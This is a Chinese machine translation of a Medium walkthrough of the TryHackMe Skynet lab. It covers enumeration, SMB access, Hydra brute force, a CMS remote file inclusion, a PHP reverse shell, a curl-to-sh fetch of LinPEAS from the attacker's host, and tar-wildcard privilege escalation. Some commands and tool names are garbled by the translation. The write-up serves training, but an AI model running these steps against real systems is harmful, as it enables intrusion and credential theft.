<html>
<head>
<title>Hasta la vista, baby</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">再见，宝贝</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hasta-la-vista-baby-1c5de4e66cac?source=collection_archive---------4-----------------------#2020-10-25">https://infosecwriteups.com/hasta-la-vista-baby-1c5de4e66cac?source=collection_archive---------4-----------------------#2020-10-25</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><h2 id="6ca7" class="ir is it bd b dl iu iv iw ix iy iz dk ja translated" aria-label="kicker paragraph"><a class="ae ep" href="https://medium.com/@vadimpolovnikov" rel="noopener">道德黑客文章和评论</a></h2><div class=""/><p id="bff6" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">TryHackMe天网机器演练</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi kx"><img src="../Images/02e526999b0ef0d5c8615754553c2de8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZDtpoorZ8PrCnZPKngY1rw.png"/></div></div><figcaption class="lj lk gj gh gi ll lm bd b be z dk translated">从tryhackme.com取回</figcaption></figure><h2 id="95ce" class="ln lo it bd lp lq lr dn ls lt lu dp lv kk lw lx ly ko lz ma mb ks mc md me iz bi translated">[摘要]</h2><p id="5004" class="pw-post-body-paragraph jz ka it kb b kc mf ke kf kg mg ki kj kk mh km kn ko mi kq kr ks mj ku kv kw im bi translated">TryHackMe Skynet机器可能是我在枚举和完全妥协之间运行时间最长的一次。它有各种信息收集媒介，如HTTP、SMB、IMAP、POP3等。以及针对易受攻击的CMS和tar实用程序的复杂权限提升方式。</p><p id="da3c" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">开发组件包括但不限于:</p><ul class=""><li id="dd68" class="mk ml it kb b kc kd kg kh kk mm ko mn ks mo kw mp mq mr ms bi translated">Nmap和NSE脚本</li><li id="eaef" class="mk ml it kb b kc mt kg mu kk mv ko mw ks mx kw mp mq mr ms bi translated">smbclient和rpcclient</li><li id="1d7d" class="mk ml it kb b kc mt kg mu kk mv ko mw ks mx kw mp mq mr ms bi translated">enum4linux</li><li id="2531" class="mk ml it kb b kc mt kg mu kk mv ko mw ks mx kw mp mq mr ms bi translated">GoBuster</li><li id="04ca" class="mk ml it kb b kc mt kg mu kk mv ko mw ks mx kw mp mq mr ms bi translated">硬石膏</li><li id="41a7" class="mk ml it kb b kc mt kg mu kk mv ko mw ks mx kw mp mq mr ms bi translated">THC-Hydra</li><li id="51fe" class="mk ml it kb b kc mt kg mu kk mv ko mw ks mx kw mp mq mr ms bi translated">利用数据库</li><li id="f4f5" class="mk ml it kb b kc mt kg mu kk mv ko mw ks mx kw mp mq mr ms bi translated">Python、Bash和PHP</li><li id="3ad4" class="mk ml it kb b kc mt kg mu kk mv ko mw ks mx kw mp mq mr ms bi translated">等等</li></ul></div><div class="ab cl my mz hx na" role="separator"><span class="nb bw bk nc nd ne"/><span class="nb bw bk nc nd ne"/><span class="nb bw bk nc nd"/></div><div class="im in io ip iq"><h2 id="ed68" class="ln lo it bd lp lq lr dn ls lt lu dp lv kk lw lx ly ko lz ma mb ks mc md me iz bi translated">[任务1]</h2><p id="f4c4" class="pw-post-body-paragraph jz ka it kb b kc mf ke kf kg mg ki kj kk mh km kn ko mi kq kr ks mj ku kv kw im bi translated">基本Nmap扫描:</p><p id="f170" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated"><code class="fe nf ng nh ni b">nmap -sS -sV -O -T4 &lt;ip-address&gt; -oN basic_scan.nmap</code></p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi nj"><img src="../Images/ddc02037cb80131299ac322dee71066b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WUFrssZoOEoPjbEA1FUuxg.png"/></div></div></figure><p id="6d8e" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">该扫描揭示了我们可以采取的进一步指纹识别途径，我建议运行以下扫描:</p><blockquote class="nk nl nm"><p id="f618" class="jz ka nn kb b kc kd ke kf kg kh ki kj no kl km kn np kp kq kr nq kt ku kv kw im bi translated">sudo gobuster dir-u<a class="ae nr" href="http://ip-addr%20-w%20/usr/share/wordlists/dirb/common.txt" rel="noopener ugc nofollow" target="_blank">http://IP-addr</a>-w/usr/share/word lists/dirb/common . txt</p><p id="a6aa" class="jz ka nn kb b kc kd ke kf kg kh ki kj no kl km kn np kp kq kr nq kt ku kv kw im bi translated">nmap-script = vuln IP-addr-oN vuln _ scan . nmap</p><p id="2442" class="jz ka nn kb b kc kd ke kf kg kh ki kj no kl km kn np kp kq kr nq kt ku kv kw im bi translated">enum 4 Linux-A IP-addr &gt; SMB _ enum . txt</p><p id="d0e0" class="jz ka nn kb b kc kd ke kf kg kh ki kj no kl km kn np kp kq kr nq kt ku kv kw im bi translated">nmap-script = SMB-enum-share . NSE IP-addr</p></blockquote><p id="f26e" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">Gobuster的扫描输出:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi ns"><img src="../Images/483ac69ee12c00621d64a8f3671f664d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jMAkhhOYhA0j16SgGhgceA.png"/></div></div></figure><p id="0558" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated"><strong class="kb jd"> <em class="nn"> /squirrelmail </em> </strong>指向基于web的邮件服务。它运行在PHP上，支持IMAP和SMTP服务。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi nt"><img src="../Images/01d65a67612ea57591fc320ca7303785.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1EzDMUMVMvGPaBrzG-N6TQ.png"/></div></div></figure><p id="b327" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">来自<strong class="kb jd"> <em class="nn"> enum4linux </em> </strong>和Nmap的<strong class="kb jd"><em class="nn">SMB-enum-shares</em></strong>NSE脚本的输出有一些关于邮件服务的潜在用户的提示。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi nt"><img src="../Images/cdc6b4a262865b6e0396523ab121457e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*w1WCyNiRdp008zsMvbBAOQ.png"/></div></div></figure><p id="421d" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">用户可能是milesdyson。但是什么可能是密码呢？</p><p id="3ec0" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">有匿名共享可用，所以下面的<strong class="kb jd"> <em class="nn"> smbclient </em> </strong>命令会让我们在共享文件夹中:</p><p id="f525" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated"><code class="fe nf ng nh ni b">smbclient //ip-addr/anonymous</code></p><p id="8b67" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">浏览目录并找到带有密码的文件。我们将使用该文件作为THC-Hydra的<strong class="kb jd"><em class="nn"/></strong>输入，用于邮件服务登录暴力破解。</p><p id="279f" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">用Burp套件拦截登录请求…</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi nu"><img src="../Images/4981b5d60a6dea135ae63eca934ff770.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gPj7RjreNMPt5p8bs_pxKQ.png"/></div></div></figure><p id="d137" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">…并使用POST表单作为hydra的http-form-post密码攻击的模板。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi nv"><img src="../Images/96059e9ab3abb480bbfc5a17320dabd3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4D9YHwxw5paWK3WBEC6qfA.png"/></div></div></figure><p id="5bed" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">登录邮件服务。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi nw"><img src="../Images/4da09f9e5b535a36b123149f4f931815.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VjdVOwHHeMIIrE3oVDQB3A.png"/></div></div></figure><p id="0b44" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">其中一条消息包含我们之前发现的SMB共享的milesdyson密码。以下命令将完成这项工作:</p><p id="e9eb" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated"><code class="fe nf ng nh ni b">smbclient -U milesdyson //ip-addr/milesdyson</code></p><p id="97ce" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">浏览并下载一个似乎很重要的文件</p><p id="2096" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">发现隐藏目录后，浏览CMS网页…</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi nx"><img src="../Images/02e5a84fb8ad5019fd7f69295444cda7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MLO1SoVVNQt_bawYtqabvA.png"/></div></div></figure><p id="2e36" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">…谷歌一下可用的公共漏洞(<a class="ae nr" href="https://www.exploit-db.com/exploits/25971" rel="noopener ugc nofollow" target="_blank"> Exploit-DB </a>):</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi ny"><img src="../Images/14e667bcf520cc608f654421af4accae.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0U4sVdJ853cTJlScfuVG2w.png"/></div></div><figcaption class="lj lk gj gh gi ll lm bd b be z dk translated">从<a class="ae nr" href="https://www.exploit-db.com/exploits/25971" rel="noopener ugc nofollow" target="_blank">漏洞利用数据库</a>中检索</figcaption></figure><p id="b22d" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">上面的屏幕截图总结了CMS软件上存在的远程文件包含漏洞，并建议了一组进一步的操作。</p><p id="9dd1" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">“非PHP代码将嵌入到输出中”:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi nz"><img src="../Images/1b48ab8f667482e4222bddc6591ea873.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3zsm561FJoUaVGJqCEkP5g.png"/></div></div></figure><p id="98f9" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">“将评估此文件中的PHP代码”:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi oa"><img src="../Images/b7496994a399c0c116fcaf69ad399b78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*v_SR_6gWWhfuJJ7nrssDLQ.png"/></div></div></figure><p id="b09b" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">本例中使用的反向shell是<a class="ae nr" href="https://github.com/pentestmonkey/php-reverse-shell" rel="noopener ugc nofollow" target="_blank">pentest monkey PHP-reverse-shell</a>。</p><p id="deaa" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">逃离有限外壳的技巧:</p><blockquote class="nk nl nm"><p id="d2ed" class="jz ka nn kb b kc kd ke kf kg kh ki kj no kl km kn np kp kq kr nq kt ku kv kw im bi translated"><strong class="kb jd">Python-c " import pty；pty.spawn("/bin/bash")" </strong></p><p id="6e3d" class="jz ka nn kb b kc kd ke kf kg kh ki kj no kl km kn np kp kq kr nq kt ku kv kw im bi translated"><strong class="kb jd">出口期限=xterm </strong></p></blockquote><p id="3285" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">从这一点出发，我建议您将<a class="ae nr" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" rel="noopener ugc nofollow" target="_blank"> LinPEAS </a> Linux枚举脚本上传到目标机器上，并观察PE的潜在向量。我用于脚本上传的方法概述如下:</p><ol class=""><li id="82a7" class="mk ml it kb b kc kd kg kh kk mm ko mn ks mo kw ob mq mr ms bi translated">本地机器:<strong class="kb jd"><em class="nn">python 3-m http . server 80</em></strong></li><li id="5ea7" class="mk ml it kb b kc mt kg mu kk mv ko mw ks mx kw ob mq mr ms bi translated">远程机器:<strong class="kb jd"><em class="nn">curl-X GET</em></strong><a class="ae nr" href="http://ip-addr/REVSHELL.php" rel="noopener ugc nofollow" target="_blank"><strong class="kb jd"><em class="nn">http://IP-addr/</em></strong></a><strong class="kb jd"><em class="nn">linpeas . sh | sh</em></strong></li></ol><p id="d027" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">Crontab作业:</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi oc"><img src="../Images/f35b40f1c8753375fe2e6765e36fd8f4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ilsu9RRG4mSUEsx1x9lQaA.png"/></div></div></figure><p id="500d" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">找到脚本并理解它的作用。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi od"><img src="../Images/e82c9289c9b6830fbf64e102f4842778.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sBBwkxkRksLg4ULehSy15g.png"/></div></div></figure><p id="181b" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">下面的<a class="ae nr" href="https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/" rel="noopener ugc nofollow" target="_blank"> <strong class="kb jd"> <em class="nn">链接</em> </strong> </a>包含了对漏洞的惊人描述一个<strong class="kb jd"> * </strong>通配符与<strong class="kb jd"> <em class="nn"> tar </em> </strong>实用程序组合构成一个系统。</p><p id="2955" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">可以采取以下步骤将您的特权提升到最高级别。</p><figure class="ky kz la lb gt lc gh gi paragraph-image"><div role="button" tabindex="0" class="ld le di lf bf lg"><div class="gh gi oe"><img src="../Images/c4f9de13bca33b60369ba505f26a4ce8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Skhrsxwfo7PiNnObLXPc6Q.png"/></div></div><figcaption class="lj lk gj gh gi ll lm bd b be z dk translated">pentestmonkey Bash反向外壳</figcaption></figure><p id="bd29" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">现在，在本地机器上启动NetCat监听器，等待目标服务器通过根终端连接到您。</p></div><div class="ab cl my mz hx na" role="separator"><span class="nb bw bk nc nd ne"/><span class="nb bw bk nc nd ne"/><span class="nb bw bk nc nd"/></div><div class="im in io ip iq"><p id="6af0" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">感谢您加入我的这个TryHackMe天网演练，我希望我会看到你的下一个。黑客快乐！</p><p id="dc73" class="pw-post-body-paragraph jz ka it kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw im bi translated">如果你想看看我的其他文章和评论，点击<strong class="kb jd">链接</strong>(文章的第一行，就在标题上方)或者选择下面的一些。</p><div class="of og gp gr oh oi"><a href="https://medium.com/bugbountywriteup/blind-union-based-sqli-with-python-f1a8190feb43" rel="noopener follow" target="_blank"><div class="oj ab fo"><div class="ok ab ol cl cj om"><h2 class="bd jd gy z fp on fr fs oo fu fw jc bi translated">基于Python的盲联合SQLi</h2><div class="op l"><h3 class="bd b gy z fp on fr fs oo fu fw dk translated">了解Python如何在速度上击败Burp Suite，并提高您的黑客效率。</h3></div><div class="oq l"><p class="bd b dl z fp on fr fs oo fu fw dk translated">medium.com</p></div></div><div class="or l"><div class="os l ot ou ov or ow lh oi"/></div></div></a></div><div class="of og gp gr oh oi"><a href="https://medium.com/bugbountywriteup/is-this-password-manager-safe-fd8886a78afd" rel="noopener follow" target="_blank"><div class="oj ab fo"><div class="ok ab ol cl cj om"><h2 class="bd jd gy z fp on fr fs oo fu fw jc bi translated">这个密码管理器安全吗？</h2><div class="op l"><h3 class="bd b gy z fp on fr fs oo fu fw dk translated">TryHackMe trans over machine演练，包含Burp Suite、JavaScript、开膛手John和LinPEAS。</h3></div><div class="oq l"><p class="bd b dl z fp on fr fs oo fu fw dk translated">medium.com</p></div></div><div class="or l"><div class="ox l ot ou ov or ow lh oi"/></div></div></a></div><div class="of og gp gr oh oi"><a href="https://medium.com/bugbountywriteup/your-neighbours-music-sucks-aircrack-ng-for-the-rescue-a5124a2e2734" rel="noopener follow" target="_blank"><div class="oj ab fo"><div class="ok ab ol cl cj om"><h2 class="bd jd gy z fp on fr fs oo fu fw jc bi translated">你邻居的音乐很烂？救援飞机来了！</h2><div class="op l"><h3 class="bd b gy z fp on fr fs oo fu fw dk translated">有趣而简单的Wi-Fi认证攻击将您的邻居踢出网络。</h3></div><div class="oq l"><p class="bd b dl z fp on fr fs oo fu fw dk translated">medium.com</p></div></div><div class="or l"><div class="oy l ot ou ov or ow lh oi"/></div></div></a></div></div></div>    
</body>
</html>